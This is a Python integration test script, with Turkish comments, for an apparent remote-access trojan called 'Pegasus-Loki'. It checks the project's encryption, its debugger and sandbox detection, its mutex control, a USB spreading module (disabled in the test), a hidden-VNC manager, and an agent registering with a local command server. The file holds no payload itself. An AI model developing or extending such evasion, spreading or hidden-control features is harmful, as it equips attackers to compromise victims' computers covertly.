#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Pegasus-Loki Entegrasyon Test Scripti
Tüm Pegasus özelliklerinin çalışıp çalışmadığını test eder
"""

import os
import sys
import time
import json
import requests
import threading
import subprocess
from pathlib import Path

# Test konfigürasyonu
TEST_CONFIG = {
    'server_url': 'http://localhost:8080',
    'test_agent_id': 'test_pegasus_agent',
    'test_duration': 30,  # saniye
    'verbose': True
}

class PegasusIntegrationTest:
    """
    Pegasus entegrasyon test sınıfı
    """
    
    def __init__(self):
        self.server_url = TEST_CONFIG['server_url']
        self.agent_id = TEST_CONFIG['test_agent_id']
        self.verbose = TEST_CONFIG['verbose']
        self.test_results = {}
        
    def log(self, message, level="INFO"):
        """Test log mesajı"""
        if self.verbose:
            timestamp = time.strftime("%H:%M:%S")
            print(f"[{timestamp}] [{level}] {message}")
    
    def test_crypto_module(self):
        """Pegasus şifreleme modülünü test eder"""
        self.log("Pegasus şifreleme modülü test ediliyor...")
        
        try:
            sys.path.append('agent')
            from pegasus_crypto import PegasusConfig, PegasusAES
            
            # Konfigürasyon testi
            config = PegasusConfig()
            self.log(f"Konfigürasyon yüklendi: {config.get_setting('version')}")
            
            # Şifreleme testi
            crypto = PegasusAES(config.master_key)
            test_data = "Pegasus-Loki test verisi: ğüşıöç"
            
            encrypted = crypto.encrypt(test_data)
            decrypted = crypto.decrypt(encrypted)
            
            success = test_data == decrypted
            self.test_results['crypto'] = {
                'success': success,
                'original': test_data,
                'encrypted_length': len(encrypted),
                'decrypted': decrypted
            }
            
            self.log(f"Şifreleme testi: {'✓ BAŞARILI' if success else '✗ BAŞARISIZ'}")
            return success
            
        except Exception as e:
            self.log(f"Şifreleme testi hatası: {e}", "ERROR")
            self.test_results['crypto'] = {'success': False, 'error': str(e)}
            return False
    
    def test_security_module(self):
        """Güvenlik modülünü test eder"""
        self.log("Güvenlik modülü test ediliyor...")
        
        try:
            from pegasus_security import SecurityManager, MutexControl, AntiAnalysis
            
            # Mutex testi
            mutex = MutexControl("TestMutex")
            mutex_created = mutex.create_mutex()
            if mutex_created:
                mutex.release_mutex()
            
            # Anti-analiz testi
            debugger_present = AntiAnalysis.is_debugger_present()
            is_sandbox, sandbox_indicators = AntiAnalysis.is_sandbox()
            
            # Güvenlik yöneticisi testi
            security_manager = SecurityManager()
            security_status = security_manager.get_status()
            
            self.test_results['security'] = {
                'success': True,
                'mutex_test': mutex_created,
                'debugger_present': debugger_present,
                'sandbox_detected': is_sandbox,
                'sandbox_indicators': sandbox_indicators,
                'security_status': security_status
            }
            
            self.log("Güvenlik testi: ✓ BAŞARILI")
            return True
            
        except Exception as e:
            self.log(f"Güvenlik testi hatası: {e}", "ERROR")
            self.test_results['security'] = {'success': False, 'error': str(e)}
            return False
    
    def test_usb_module(self):
        """USB modülünü test eder"""
        self.log("USB modülü test ediliyor...")
        
        try:
            from pegasus_usb import USBManager, USBSpread
            
            # USB tespit testi
            usb_spread = USBSpread(enabled=False)  # Test için devre dışı
            drives = usb_spread.get_removable_drives()
            
            # USB yöneticisi testi
            usb_manager = USBManager()
            status = usb_manager.get_status()
            
            self.test_results['usb'] = {
                'success': True,
                'removable_drives': drives,
                'manager_status': status
            }
            
            self.log(f"USB testi: ✓ BAŞARILI (Tespit edilen sürücüler: {len(drives)})")
            return True
            
        except Exception as e:
            self.log(f"USB testi hatası: {e}", "ERROR")
            self.test_results['usb'] = {'success': False, 'error': str(e)}
            return False
    
    def test_hvnc_module(self):
        """HVNC modülünü test eder"""
        self.log("HVNC modülü test ediliyor...")
        
        try:
            from pegasus_hvnc import HVNCManager
            
            # HVNC yöneticisi testi
            hvnc_manager = HVNCManager()
            status = hvnc_manager.get_status()
            
            self.test_results['hvnc'] = {
                'success': True,
                'status': status,
                'platform_supported': status.get('platform_supported', False)
            }
            
            platform_support = "✓ Destekleniyor" if status.get('platform_supported') else "⚠ Kısıtlı destek"
            self.log(f"HVNC testi: ✓ BAŞARILI ({platform_support})")
            return True
            
        except Exception as e:
            self.log(f"HVNC testi hatası: {e}", "ERROR")
            self.test_results['hvnc'] = {'success': False, 'error': str(e)}
            return False
    
    def test_server_api(self):
        """Sunucu API'sini test eder"""
        self.log("Sunucu API test ediliyor...")
        
        try:
            # Test endpoint'i
            response = requests.get(f"{self.server_url}/api/test", timeout=5)
            if response.status_code == 200:
                test_data = response.json()
                self.log(f"API test endpoint'i: ✓ BAŞARILI")
            else:
                raise Exception(f"API test endpoint'i başarısız: {response.status_code}")

            # Sistem bilgisi endpoint'i
            response = requests.get(f"{self.server_url}/api/system/info", timeout=5)
            if response.status_code == 200:
                system_info = response.json()
                self.log(f"Sistem bilgisi endpoint'i: ✓ BAŞARILI")
            else:
                raise Exception(f"Sistem bilgisi endpoint'i başarısız: {response.status_code}")
            
            # Agent hello testi
            agent_info = {
                'platform': 'Test Platform',
                'hostname': 'test-host',
                'username': 'test-user',
                'version': '2.0-pegasus-test'
            }
            
            response = requests.post(
                f"{self.server_url}/api/{self.agent_id}/hello",
                json=agent_info,
                timeout=5
            )
            
            hello_success = response.status_code == 200
            
            self.test_results['server_api'] = {
                'success': True,
                'test_endpoint': test_data,
                'system_info': system_info,
                'hello_test': hello_success
            }
            
            self.log("Sunucu API testi: ✓ BAŞARILI")
            return True
            
        except Exception as e:
            self.log(f"Sunucu API testi hatası: {e}", "ERROR")
            self.test_results['server_api'] = {'success': False, 'error': str(e)}
            return False
    
    def test_agent_integration(self):
        """Agent entegrasyonunu test eder"""
        self.log("Agent entegrasyonu test ediliyor...")
        
        try:
            from pegasus_agent import PegasusLokiAgent
            
            # Agent oluştur (başlatma)
            agent = PegasusLokiAgent()
            
            # Temel bilgileri kontrol et
            agent_info = {
                'uid': agent.uid,
                'hostname': agent.hostname,
                'username': agent.username,
                'platform': agent.platform
            }
            
            self.test_results['agent_integration'] = {
                'success': True,
                'agent_info': agent_info,
                'initialized': hasattr(agent, 'initialized')
            }
            
            self.log("Agent entegrasyon testi: ✓ BAŞARILI")
            return True
            
        except Exception as e:
            self.log(f"Agent entegrasyon testi hatası: {e}", "ERROR")
            self.test_results['agent_integration'] = {'success': False, 'error': str(e)}
            return False
    
    def run_all_tests(self):
        """Tüm testleri çalıştırır"""
        self.log("=" * 60)
        self.log("PEGASUS-LOKI ENTEGRASYON TESTLERİ BAŞLATIYOR")
        self.log("=" * 60)
        
        start_time = time.time()
        
        # Test listesi
        tests = [
            ('Şifreleme Modülü', self.test_crypto_module),
            ('Güvenlik Modülü', self.test_security_module),
            ('USB Modülü', self.test_usb_module),
            ('HVNC Modülü', self.test_hvnc_module),
            ('Sunucu API', self.test_server_api),
            ('Agent Entegrasyonu', self.test_agent_integration)
        ]
        
        # Testleri çalıştır
        passed_tests = 0
        total_tests = len(tests)
        
        for test_name, test_func in tests:
            self.log(f"\n--- {test_name} Testi ---")
            try:
                if test_func():
                    passed_tests += 1
            except Exception as e:
                self.log(f"{test_name} testi kritik hata: {e}", "ERROR")
        
        # Sonuçları göster
        end_time = time.time()
        duration = end_time - start_time
        
        self.log("\n" + "=" * 60)
        self.log("TEST SONUÇLARI")
        self.log("=" * 60)
        self.log(f"Toplam Test: {total_tests}")
        self.log(f"Başarılı: {passed_tests}")
        self.log(f"Başarısız: {total_tests - passed_tests}")
        self.log(f"Başarı Oranı: %{(passed_tests/total_tests)*100:.1f}")
        self.log(f"Test Süresi: {duration:.2f} saniye")
        
        # Detaylı sonuçları kaydet
        self.save_test_results()
        
        return passed_tests == total_tests
    
    def save_test_results(self):
        """Test sonuçlarını dosyaya kaydeder"""
        try:
            results_file = "pegasus_test_results.json"
            
            test_summary = {
                'timestamp': time.strftime("%Y-%m-%d %H:%M:%S"),
                'total_tests': len(self.test_results),
                'passed_tests': sum(1 for r in self.test_results.values() if r.get('success', False)),
                'results': self.test_results
            }
            
            with open(results_file, 'w', encoding='utf-8') as f:
                json.dump(test_summary, f, indent=2, ensure_ascii=False)
            
            self.log(f"Test sonuçları kaydedildi: {results_file}")
            
        except Exception as e:
            self.log(f"Test sonuçları kaydetme hatası: {e}", "ERROR")

def check_server_running():
    """Sunucunun çalışıp çalışmadığını kontrol eder"""
    try:
        response = requests.get(TEST_CONFIG['server_url'], timeout=5)
        return True
    except:
        return False

def main():
    """Ana test fonksiyonu"""
    print("🧪 Pegasus-Loki Entegrasyon Test Aracı")
    print("=" * 50)
    
    # Sunucu kontrolü
    if not check_server_running():
        print("⚠️  UYARI: Sunucu çalışmıyor gibi görünüyor")
        print(f"   Sunucu URL: {TEST_CONFIG['server_url']}")
        print("   Lütfen önce sunucuyu başlatın: python app.py")
        
        choice = input("\nYine de testlere devam edilsin mi? (y/N): ")
        if choice.lower() != 'y':
            return
    
    # Testleri çalıştır
    tester = PegasusIntegrationTest()
    success = tester.run_all_tests()
    
    if success:
        print("\n🎉 Tüm testler başarılı!")
        print("✅ Pegasus-Loki entegrasyonu çalışıyor")
    else:
        print("\n❌ Bazı testler başarısız!")
        print("🔧 Lütfen hataları kontrol edin ve düzeltin")
    
    print(f"\n📊 Detaylı sonuçlar: pegasus_test_results.json")

if __name__ == "__main__":
    main()
